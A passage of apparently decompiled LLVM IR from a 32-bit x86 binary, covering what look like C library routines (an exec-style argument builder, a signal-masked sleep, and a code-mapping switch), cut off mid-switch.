  uselistorder i32 %v1_804f1fa, { 1, 0 }
  uselistorder i32 %v2_804f1f6, { 1, 0 }
  uselistorder i32 %v1_804f1f3, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_804f222, { 2, 0, 1 }
  uselistorder i8 %v2_804f1e6, { 1, 0, 2 }
  uselistorder i32 %v14_804f1de, { 0, 2, 1 }
  uselistorder i32 %v0_804f1d8, { 1, 0 }
  uselistorder i32 %v0_804f1cc, { 1, 0, 2 }
  uselistorder i32 %v3_804f1ba, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804f1af, { 1, 0 }
  uselistorder i32 %v1_804f1a2, { 1, 0, 2 }
  uselistorder i8 %stack_var_-18.0, { 1, 0 }
  uselistorder i32 %v0_804f1a1, { 1, 2, 0, 3, 4 }
  uselistorder i8 %tmp37, { 1, 0 }
  uselistorder i8 %v2_804f16a.lcssa, { 1, 0 }
  uselistorder i32 %v0_804f169.lcssa, { 1, 0 }
  uselistorder i32 %v1_804f169, { 0, 3, 2, 1 }
  uselistorder i32 %v0_804f15f, { 1, 0, 2 }
  uselistorder i32 %v4_804f157, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32* %esi.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 6, 1, 7, 2, 3, 4, 5, 8, 9 }
  uselistorder i32* %ecx.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 10, 11, 5, 6, 7, 8, 9, 12, 13, 14, 15, 0 }
  uselistorder i32 -17, { 1, 3, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f25b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f236, { 1, 0 }
  uselistorder label %dec_label_pc_804f1f3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f1da, { 1, 0 }
  uselistorder label %dec_label_pc_804f1bd, { 1, 0 }
  uselistorder label %dec_label_pc_804f1b2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f18f, { 1, 0 }
  uselistorder label %dec_label_pc_804f18e, { 1, 0 }
  uselistorder label %dec_label_pc_804f169, { 1, 0 }
}

define i32 @function_804f274(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f274:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_804f287 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804f287, i32* @ebx, align 4
  %v2_804f28c = call i32 @function_804f65e(i32 %v2_804f287, i32 134542939)
  %v1_804f298 = call i32 @function_804f65b(i32 ptrtoint (i32* @global_var_8056420.170 to i32))
  %v0_804f29d = load i32, i32* @global_var_8058b04.171, align 4
  store i32 %v0_804f29d, i32* @eax, align 4
  %v1_804f2a5 = icmp eq i32 %v0_804f29d, 0
  br i1 %v1_804f2a5, label %dec_label_pc_804f2b2, label %dec_label_pc_804f2a9

dec_label_pc_804f2a9:                             ; preds = %dec_label_pc_804f274
  %v0_804f2ac = load i32, i32* @esi, align 4
  %v1_804f2ad = call i32 @unknown_0(i32 %v0_804f2ac)
  store i32 %v1_804f2ad, i32* @eax, align 4
  br label %dec_label_pc_804f2b2

dec_label_pc_804f2b2:                             ; preds = %dec_label_pc_804f274, %dec_label_pc_804f2a9
  %v2_804f2b7 = call i32 @function_804f65e(i32 %v2_804f287, i32 1)
  %v0_804f2bc = call i32 @function_804f61c()
  %v0_804f2cd = call i32 @function_804c236()
  %v0_804f2d5 = load i32, i32* @esi, align 4
  %v1_804f2d6 = call i32 @function_804fab8(i32 %v0_804f2d5)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_804fab8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f2b2, { 1, 0 }
}

define i32 @function_804f2dc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804f2dc:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_804f2e2 = load i32, i32* @ebx, align 4
  store i32 %v0_804f2e2, i32* %stack_var_-12, align 4
  %v2_804f2e3 = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_804f2e3, i32* %eax.global-to-local, align 4
  %v12_804f2e6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_804f2ec

dec_label_pc_804f2ec:                             ; preds = %dec_label_pc_804f2ec, %dec_label_pc_804f2dc
  %v0_804f2ef = phi i32 [ 0, %dec_label_pc_804f2dc ], [ %v1_804f2ef, %dec_label_pc_804f2ec ]
  %stack_var_-16.0 = phi i32 [ %v2_804f2e3, %dec_label_pc_804f2dc ], [ %v1_804f2f0, %dec_label_pc_804f2ec ]
  %v1_804f2ef = add i32 %v0_804f2ef, 1
  store i32 %v1_804f2ef, i32* %esi.global-to-local, align 4
  %v1_804f2f0 = add i32 %stack_var_-16.0, 4
  store i32 %v1_804f2f0, i32* %eax.global-to-local, align 4
  %v1_804f2f6 = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_804f2f6 = load i32, i32* %v1_804f2f6, align 4
  %v3_804f2f6 = icmp eq i32 %v2_804f2f6, 0
  %v1_804f2f9 = icmp eq i1 %v3_804f2f6, false
  br i1 %v1_804f2f9, label %dec_label_pc_804f2ec, label %dec_label_pc_804f2fb

dec_label_pc_804f2fb:                             ; preds = %dec_label_pc_804f2ec
  %v1_804f2fb = mul i32 %v1_804f2ef, 4
  %v2_804f2fb = add i32 %v1_804f2fb, 34
  %v1_804f302 = and i32 %v2_804f2fb, -16
  %v2_804f305 = sub i32 %v12_804f2e6, %v1_804f302
  %v1_804f30a = add i32 %v2_804f305, 15
  %v1_804f30e = and i32 %v1_804f30a, -16
  store i32 %v1_804f30e, i32* @ebx, align 4
  store i32 %v1_804f30e, i32* %ecx.global-to-local, align 4
  %v2_804f313 = inttoptr i32 %v1_804f30e to i32*
  store i32 %arg2, i32* %v2_804f313, align 16
  store i32 %v2_804f2e3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f31b

dec_label_pc_804f31b:                             ; preds = %dec_label_pc_804f31b, %dec_label_pc_804f2fb
  %stack_var_-16.1 = phi i32 [ %v2_804f2e3, %dec_label_pc_804f2fb ], [ %v1_804f322, %dec_label_pc_804f31b ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_804f31e = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f31e = add i32 %v0_804f31e, 4
  store i32 %v1_804f31e, i32* %ecx.global-to-local, align 4
  %v0_804f321 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f321 = add i32 %v0_804f321, -1
  %v8_804f321 = icmp eq i32 %v1_804f321, 0
  store i32 %v1_804f321, i32* %esi.global-to-local, align 4
  %v1_804f322 = add i32 %stack_var_-16.1, 4
  %v1_804f328 = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_804f328 = load i32, i32* %v1_804f328, align 4
  store i32 %v2_804f328, i32* %eax.global-to-local, align 4
  %v2_804f32a = inttoptr i32 %v1_804f31e to i32*
  store i32 %v2_804f328, i32* %v2_804f32a, align 4
  %v1_804f32c = icmp eq i1 %v8_804f321, false
  br i1 %v1_804f32c, label %dec_label_pc_804f31b, label %dec_label_pc_804f32e

dec_label_pc_804f32e:                             ; preds = %dec_label_pc_804f31b
  %v0_804f32e = load i32, i32* %eax.global-to-local, align 4
  %v1_804f32e = load i32, i32* @esp, align 4
  %v2_804f32e = add i32 %v1_804f32e, -4
  %v3_804f32e = inttoptr i32 %v2_804f32e to i32*
  store i32 %v0_804f32e, i32* %v3_804f32e, align 4
  %v0_804f32f = load i32, i32* @global_var_8058b0c.172, align 4
  %v2_804f32f = add i32 %v1_804f32e, -8
  %v3_804f32f = inttoptr i32 %v2_804f32f to i32*
  store i32 %v0_804f32f, i32* %v3_804f32f, align 4
  %v0_804f335 = load i32, i32* @ebx, align 4
  %v2_804f335 = add i32 %v1_804f32e, -12
  %v3_804f335 = inttoptr i32 %v2_804f335 to i32*
  store i32 %v0_804f335, i32* %v3_804f335, align 4
  %v5_804f336 = add i32 %v1_804f32e, -16
  %v6_804f336 = inttoptr i32 %v5_804f336 to i32*
  store i32 %arg1, i32* %v6_804f336, align 4
  %v1_804f339 = inttoptr i32 %v1_804f322 to i8*
  %v2_804f339 = call i32 @function_804fb48(i8* %v1_804f339)
  store i32 %v2_804f339, i32* %eax.global-to-local, align 4
  %v2_804f341 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f341, i32* @ebx, align 4
  ret i32 %v2_804f339

; uselistorder directives
  uselistorder i32 %v1_804f321, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_804f2f0, { 1, 0 }
  uselistorder i32 %v1_804f2ef, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_804f2e3, { 0, 2, 1, 3 }
}

define i32 @function_804f348(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f348:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_804f348 = load i32, i32* @ebp, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  %v0_804f34e = load i32, i32* @edi, align 4
  %v0_804f34f = load i32, i32* @esi, align 4
  %v0_804f350 = load i32, i32* @ebx, align 4
  %v15_804f351 = ptrtoint i32* %stack_var_-444 to i32
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_804f35e = icmp eq i32 %arg1, 0
  %v1_804f360 = icmp eq i1 %v1_804f35e, false
  br i1 %v1_804f360, label %dec_label_pc_804f372.preheader, label %dec_label_pc_804f4bf

dec_label_pc_804f372.preheader:                   ; preds = %dec_label_pc_804f348
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f367

dec_label_pc_804f367:                             ; preds = %dec_label_pc_804f367.dec_label_pc_804f367_crit_edge, %dec_label_pc_804f372.preheader
  %v0_804f367 = phi i32 [ %v15_804f351, %dec_label_pc_804f372.preheader ], [ %v0_804f367.pre, %dec_label_pc_804f367.dec_label_pc_804f367_crit_edge ]
  %v1_804f37229 = phi i32 [ 31, %dec_label_pc_804f372.preheader ], [ %v1_804f372, %dec_label_pc_804f367.dec_label_pc_804f367_crit_edge ]
  %v2_804f367 = mul i32 %v1_804f37229, 4
  %v3_804f367 = add i32 %v2_804f367, 292
  %v4_804f367 = add i32 %v3_804f367, %v0_804f367
  %v5_804f367 = inttoptr i32 %v4_804f367 to i32*
  store i32 0, i32* %v5_804f367, align 4
  %v0_804f372.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804f372 = add i32 %v0_804f372.pre, -1
  %v9_804f372 = icmp slt i32 %v1_804f372, 0
  store i32 %v1_804f372, i32* %eax.global-to-local, align 4
  %v1_804f373 = icmp eq i1 %v9_804f372, false
  br i1 %v1_804f373, label %dec_label_pc_804f367.dec_label_pc_804f367_crit_edge, label %dec_label_pc_804f375

dec_label_pc_804f367.dec_label_pc_804f367_crit_edge: ; preds = %dec_label_pc_804f367
  %v0_804f367.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f367

dec_label_pc_804f375:                             ; preds = %dec_label_pc_804f367
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_804f38b = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_804f38b, i32* @ebx, align 4
  store i32 %v2_804f38b, i32* %stack_var_-460, align 4
  %v4_804f393 = call i32 @function_8051638(i32 %v2_804f38b, i32 17, i32 %v1_804f372, i32 %v1_804f372)
  store i32 %v4_804f393, i32* %eax.global-to-local, align 4
  %v2_804f39b = icmp slt i32 %v4_804f393, 0
  br i1 %v2_804f39b, label %dec_label_pc_804f4c3, label %dec_label_pc_804f3a3

dec_label_pc_804f3a3:                             ; preds = %dec_label_pc_804f375
  %v2_804f3a4 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_804f3a4, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_804f3af = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_804f3af = call i32 @function_804fe08(i32 0, %_TYPEDEF_sigset_t* %v3_804f3af, i32 %v2_804f3a4)
  store i32 %v4_804f3af, i32* %eax.global-to-local, align 4
  %v1_804f3b7 = icmp eq i32 %v4_804f3af, 0
  %v1_804f3b9 = icmp eq i1 %v1_804f3b7, false
  br i1 %v1_804f3b9, label %dec_label_pc_804f4c3, label %dec_label_pc_804f3bf

dec_label_pc_804f3bf:                             ; preds = %dec_label_pc_804f3a3
  store i32 %v2_804f3a4, i32* %stack_var_-460, align 4
  %v4_804f3c4 = call i32 @function_8051614(i32 %v2_804f3a4, i32 17, i32 %v4_804f3af, i32 %v4_804f3af)
  store i32 %v4_804f3c4, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_804f3d1 = icmp eq i32 %v4_804f3c4, 0
  br i1 %v1_804f3d1, label %dec_label_pc_804f3e5.preheader, label %dec_label_pc_804f48d

dec_label_pc_804f3e5.preheader:                   ; preds = %dec_label_pc_804f3bf
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f3da

dec_label_pc_804f3da:                             ; preds = %dec_label_pc_804f3da.dec_label_pc_804f3da_crit_edge, %dec_label_pc_804f3e5.preheader
  %v0_804f3da = phi i32 [ %v15_804f351, %dec_label_pc_804f3e5.preheader ], [ %v0_804f3da.pre, %dec_label_pc_804f3da.dec_label_pc_804f3da_crit_edge ]
  %v1_804f3e528 = phi i32 [ 31, %dec_label_pc_804f3e5.preheader ], [ %v1_804f3e5, %dec_label_pc_804f3da.dec_label_pc_804f3da_crit_edge ]
  %v2_804f3da = mul i32 %v1_804f3e528, 4
  %v3_804f3da = add i32 %v2_804f3da, 292
  %v4_804f3da = add i32 %v3_804f3da, %v0_804f3da
  %v5_804f3da = inttoptr i32 %v4_804f3da to i32*
  store i32 0, i32* %v5_804f3da, align 4
  %v0_804f3e5.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_804f3e5 = add i32 %v0_804f3e5.pre, -1
  %v9_804f3e5 = icmp slt i32 %v1_804f3e5, 0
  store i32 %v1_804f3e5, i32* %edx.global-to-local, align 4
  %v1_804f3e6 = icmp eq i1 %v9_804f3e5, false
  br i1 %v1_804f3e6, label %dec_label_pc_804f3da.dec_label_pc_804f3da_crit_edge, label %dec_label_pc_804f3e8

dec_label_pc_804f3da.dec_label_pc_804f3da_crit_edge: ; preds = %dec_label_pc_804f3da
  %v0_804f3da.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f3da

dec_label_pc_804f3e8:                             ; preds = %dec_label_pc_804f3da
  store i32 %v2_804f38b, i32* %eax.global-to-local, align 4
  store i32 %v2_804f38b, i32* %stack_var_-460, align 4
  %v4_804f3f4 = call i32 @function_8051638(i32 %v2_804f38b, i32 17, i32 0, i32 0)
  store i32 %v4_804f3f4, i32* %eax.global-to-local, align 4
  %v2_804f3fc = icmp slt i32 %v4_804f3f4, 0
  br i1 %v2_804f3fc, label %dec_label_pc_804f4c3, label %dec_label_pc_804f404

dec_label_pc_804f404:                             ; preds = %dec_label_pc_804f3e8
  %v2_804f405 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_804f405, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v5_804f40e = call i32 @function_804f89f(i32 17, i32* null, i32 %v2_804f405, i32 %v4_804f3f4)
  store i32 %v5_804f40e, i32* %eax.global-to-local, align 4
  %v2_804f416 = icmp slt i32 %v5_804f40e, 0
  %v1_804f418 = icmp eq i1 %v2_804f416, false
  br i1 %v1_804f418, label %dec_label_pc_804f442, label %dec_label_pc_804f41a

dec_label_pc_804f41a:                             ; preds = %dec_label_pc_804f404
  %v0_804f41a = load i32, i32* %stack_var_-460, align 4
  %v1_804f41a = call i32 @function_804baa4(i32 %v0_804f41a)
  store i32 %v1_804f41a, i32* %eax.global-to-local, align 4
  %v1_804f41f = inttoptr i32 %v1_804f41a to i32*
  %v2_804f41f = load i32, i32* %v1_804f41f, align 4
  store i32 %v2_804f41f, i32* @esi, align 4
  store i32 %v1_804f41a, i32* @ebx, align 4
  store i32 %v2_804f3a4, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_804f430 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_804f430 = call i32 @function_804fe08(i32 2, %_TYPEDEF_sigset_t* %v3_804f430, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_804f43b = load i32, i32* @esi, align 4
  %v1_804f43b = load i32, i32* @ebx, align 4
  %v2_804f43b = inttoptr i32 %v1_804f43b to i32*
  store i32 %v0_804f43b, i32* %v2_804f43b, align 4
  %v0_804f4d0.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f4c6

dec_label_pc_804f442:                             ; preds = %dec_label_pc_804f404
  %v3_804f442 = load i32, i32* %stack_var_-420, align 4
  %v12_804f442 = icmp eq i32 %v3_804f442, 1
  %v2_804f44e = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804f44e, i32* @ebx, align 4
  %v1_804f455 = icmp eq i1 %v12_804f442, false
  br i1 %v1_804f455, label %dec_label_pc_804f47c, label %dec_label_pc_804f457

dec_label_pc_804f457:                             ; preds = %dec_label_pc_804f442
  %v0_804f457 = load i32, i32* @edi, align 4
  store i32 %v2_804f44e, i32* %stack_var_-460, align 4
  %v4_804f45b = bitcast i32* %stack_var_-24 to %timespec*
  %v5_804f45b = call i32 @function_804fcf0(%timespec* %v4_804f45b, i32 %v2_804f44e, i32 %v0_804f457, i32 %v0_804f457)
  store i32 %v5_804f45b, i32* %eax.global-to-local, align 4
  store i32 %v5_804f45b, i32* @edi, align 4
  %v1_804f462 = call i32 @function_804baa4(i32 %v2_804f44e)
  store i32 %v1_804f462, i32* %eax.global-to-local, align 4
  %v1_804f46a = inttoptr i32 %v1_804f462 to i32*
  %v2_804f46a = load i32, i32* %v1_804f46a, align 4
  store i32 %v2_804f46a, i32* @esi, align 4
  store i32 %v1_804f462, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_804f473 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_804f473 = call i32 @function_804fe08(i32 2, %_TYPEDEF_sigset_t* %v3_804f473, i32 0)
  store i32 %v4_804f473, i32* %eax.global-to-local, align 4
  %v0_804f478 = load i32, i32* @esi, align 4
  %v1_804f478 = load i32, i32* @ebx, align 4
  %v2_804f478 = inttoptr i32 %v1_804f478 to i32*
  store i32 %v0_804f478, i32* %v2_804f478, align 4
  %v0_804f4a2.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804f49f

dec_label_pc_804f47c:                             ; preds = %dec_label_pc_804f442
  store i32 2, i32* %stack_var_-460, align 4
  %v3_804f482 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_804f482 = call i32 @function_804fe08(i32 2, %_TYPEDEF_sigset_t* %v3_804f482, i32 0)
  store i32 %v4_804f482, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f498

dec_label_pc_804f48d:                             ; preds = %dec_label_pc_804f3bf
  %v2_804f48f = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804f48f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f498

dec_label_pc_804f498:                             ; preds = %dec_label_pc_804f47c, %dec_label_pc_804f48d
  %storemerge3.pre-phi = phi i32 [ %v2_804f44e, %dec_label_pc_804f47c ], [ %v2_804f48f, %dec_label_pc_804f48d ]
  %v3_804f498 = phi i32 [ %v2_804f3a4, %dec_label_pc_804f47c ], [ %v4_804f3c4, %dec_label_pc_804f48d ]
  %v2_804f498 = phi i32 [ 0, %dec_label_pc_804f47c ], [ %v4_804f3c4, %dec_label_pc_804f48d ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_804f498 = bitcast i32* %stack_var_-24 to %timespec*
  %v5_804f498 = call i32 @function_804fcf0(%timespec* %v4_804f498, i32 %storemerge3.pre-phi, i32 %v2_804f498, i32 %v3_804f498)
  store i32 %v5_804f498, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f49f

dec_label_pc_804f49f:                             ; preds = %dec_label_pc_804f457, %dec_label_pc_804f498
  %v0_804f4a2 = phi i32 [ %v0_804f4a2.pre, %dec_label_pc_804f457 ], [ %v5_804f498, %dec_label_pc_804f498 ]
  %v1_804f4a2 = icmp eq i32 %v0_804f4a2, 0
  br i1 %v1_804f4a2, label %dec_label_pc_804f4bf, label %dec_label_pc_804f4a6

dec_label_pc_804f4a6:                             ; preds = %dec_label_pc_804f49f
  %v4_804f4b6 = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_804f4b6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f4c6

dec_label_pc_804f4bf:                             ; preds = %dec_label_pc_804f348, %dec_label_pc_804f49f
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f4c6

dec_label_pc_804f4c3:                             ; preds = %dec_label_pc_804f3e8, %dec_label_pc_804f3a3, %dec_label_pc_804f375
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f4c6

dec_label_pc_804f4c6:                             ; preds = %dec_label_pc_804f4bf, %dec_label_pc_804f4a6, %dec_label_pc_804f41a, %dec_label_pc_804f4c3
  %v0_804f4d0 = phi i32 [ 0, %dec_label_pc_804f4bf ], [ %v4_804f4b6, %dec_label_pc_804f4a6 ], [ %v0_804f4d0.pre, %dec_label_pc_804f41a ], [ -1, %dec_label_pc_804f4c3 ]
  store i32 %v0_804f350, i32* @ebx, align 4
  store i32 %v0_804f34f, i32* @esi, align 4
  store i32 %v0_804f34e, i32* @edi, align 4
  store i32 %v0_804f348, i32* @ebp, align 4
  ret i32 %v0_804f4d0

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804f462, { 1, 0, 2 }
  uselistorder i32 %v2_804f44e, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_804f3e5, { 2, 1, 0 }
  uselistorder i32 %v4_804f3c4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804f3a4, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v2_804f38b, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_804f372, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 0, 23 }
  uselistorder i32 (i32, i32, i32, i32)* @function_8051638, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f4c6, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804f4bf, { 1, 0 }
  uselistorder label %dec_label_pc_804f49f, { 1, 0 }
  uselistorder label %dec_label_pc_804f498, { 1, 0 }
}

define i32 @function_804f4d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f4d4:
  switch i32 %arg1, label %dec_label_pc_804f4f3 [
    i32 0, label %dec_label_pc_804f503
    i32 1, label %dec_label_pc_804f5e8
    i32 2, label %dec_label_pc_804f50d
    i32 3, label %dec_label_pc_804f517
    i32 4, label %dec_label_pc_804f521
    i32 5, label %dec_label_pc_804f5b7
    i32 6, label %dec_label_pc_804f529
    i32 7, label %dec_label_pc_804f4e9
    i32 8, label %dec_label_pc_804f4e9
    i32 9, label %dec_label_pc_804f4e9
    i32 10, label %dec_label_pc_804f4e9
    i32 11, label %dec_label_pc_804f4e9
    i32 12, label %dec_label_pc_804f4e9
    i32 13, label %dec_label_pc_804f4e9
    i32 14, label %dec_label_pc_804f4e9
    i32 15, label %dec_label_pc_804f4e9
    i32 16, label %dec_label_pc_804f4e9
    i32 17, label %dec_label_pc_804f4e9
    i32 18, label %dec_label_pc_804f4e9
    i32 19, label %dec_label_pc_804f4e9
    i32 20, label %dec_label_pc_804f4e9
    i32 21, label %dec_label_pc_804f4e9
    i32 22, label %dec_label_pc_804f4e9
    i32 23, label %dec_label_pc_804f5e8
    i32 24, label %dec_label_pc_804f5e8
    i32 25, label %dec_label_pc_804f5f4
    i32 26, label %dec_label_pc_804f5c5
    i32 27, label %dec_label_pc_804f5e8
    i32 28, label %dec_label_pc_804f53b
    i32 29, label %dec_label_pc_804f5be
    i32 30, label %dec_label_pc_804f533
    i32 31, label %dec_label_pc_804f5d3
    i32 32, label %dec_label_pc_804f5e8
    i32 33, label %dec_label_pc_804f5e8
    i32 34, label %dec_label_pc_804f5e8
    i32 35, label %dec_label_pc_804f5cc
    i32 36, label %dec_label_pc_804f5fb
    i32 37, label %dec_label_pc_804f602
    i32 38, label %dec_label_pc_804f5fb
    i32 39, label %dec_label_pc_804f545
    i32 40, label %dec_label_pc_804f609
    i32 41, label %dec_label_pc_804f5e8
    i32 42, label %dec_label_pc_804f5d3
    i32 43, label %dec_label_pc_804f602
    i32 44, label %dec_label_pc_804f610
    i32 45, label %dec_label_pc_804f602
    i32 46, label %dec_label_pc_804f5be
    i32 47, label %dec_label_pc_804f5be
    i32 48, label %dec_label_pc_804f5be
    i32 49, label %dec_label_pc_804f5e8
    i32 50, label %dec_label_pc_804f5e8
    i32 51, label %dec_label_pc_804f5be
    i32 52, label %dec_label_pc_804f5be
    i32 53, label %dec_label_pc_804f5e8
    i32 54, label %dec_label_pc_804f5e8
    i32 55, label %dec_label_pc_804f5e8
    i32 56, label %dec_label_pc_804f5e8
    i32 57, label %dec_label_pc_804f5e8
    i32 58, label %dec_label_pc_804f5e8
    i32 59, label %dec_label_pc_804f5e8
    i32 60, label %dec_label_pc_804f5e8
    i32 61, label %dec_label_pc_804f5e8
    i32 62, label %dec_label_pc_804f5e8
    i32 63, label %dec_label_pc_804f5e8
    i32 64, label %dec_label_pc_804f5e8
    i32 65, label %dec_label_pc_804f5e8
    i32 66, label %dec_label_pc_804f5e8
    i32 67, label %dec_label_pc_804f4e9
    i32 68, label %dec_label_pc_804f4e9
    i32 69, label %dec_label_pc_804f5cc
    i32 70, label %dec_label_pc_804f5cc
    i32 71, label %dec_label_pc_804f5cc
    i32 72, label %dec_label_pc_804f5d3
    i32 73, label %dec_label_pc_804f5da
    i32 74, label %dec_label_pc_804f5e1
    i32 75, label %dec_label_pc_804f54f
    i32 76, label %dec_label_pc_804f5e1
    i32 77, label %dec_label_pc_804f4e9
    i32 78, label %dec_label_pc_804f4e9
    i32 79, label %dec_label_pc_804f4e9
    i32 80, label %dec_label_pc_804f4e9
    i32 81, label %dec_label_pc_804f4e9
    i32 82, label %dec_label_pc_804f4e9
    i32 83, label %dec_label_pc_804f4e9
    i32 84, label %dec_label_pc_804f4e9
    i32 85, label %dec_label_pc_804f5e8
    i32 86, label %dec_label_pc_804f5e8
    i32 87, label %dec_label_pc_804f5c5
    i32 88, label %dec_label_pc_804f559
    i32 89, label %dec_label_pc_804f563
    i32 90, label %dec_label_pc_804f5da
    i32 91, label %dec_label_pc_804f4e9
    i32 92, label %dec_label_pc_804f4e9
    i32 93, label %dec_label_pc_804f4e9
    i32 94, label %dec_label_pc_804f4e9
    i32 95, label %dec_label_pc_804f5be
    i32 96, label %dec_label_pc_804f5e8
    i32 97, label %dec_label_pc_804f5e8
    i32 98, label %dec_label_pc_804f4e9
    i32 99, label %dec_label_pc_804f4e9
    i32 100, label %dec_label_pc_804f4e9
    i32 101, label %dec_label_pc_804f56d
    i32 102, label %dec_label_pc_804f5b0
    i32 103, label %dec_label_pc_804f5ed
    i32 104, label %dec_label_pc_804f5c5
    i32 105, label %dec_label_pc_804f577
    i32 106, label %dec_label_pc_804f5d3
    i32 107, label %dec_label_pc_804f5d3
    i32 108, label %dec_label_pc_804f5b7
    i32 109, label %dec_label_pc_804f5f4
    i32 110, label %dec_label_pc_804f610
    i32 111, label %dec_label_pc_804f5b0
    i32 112, label %dec_label_pc_804f5ed
    i32 113, label %dec_label_pc_804f610
    i32 114, label %dec_label_pc_804f581
    i32 115, label %dec_label_pc_804f609
    i32 116, label %dec_label_pc_804f5e8
    i32 117, label %dec_label_pc_804f5e8
    i32 118, label %dec_label_pc_804f58b
    i32 119, label %dec_label_pc_804f595
    i32 120, label %dec_label_pc_804f602
    i32 121, label %dec_label_pc_804f5c5
    i32 122, label %dec_label_pc_804f5c5
    i32 123, label %dec_label_pc_804f5c5
    i32 124, label %dec_label_pc_804f5c5
    i32 125, label %dec_label_pc_804f4e9
    i32 126, label %dec_label_pc_804f4e9
    i32 127, label %dec_label_pc_804f5e8
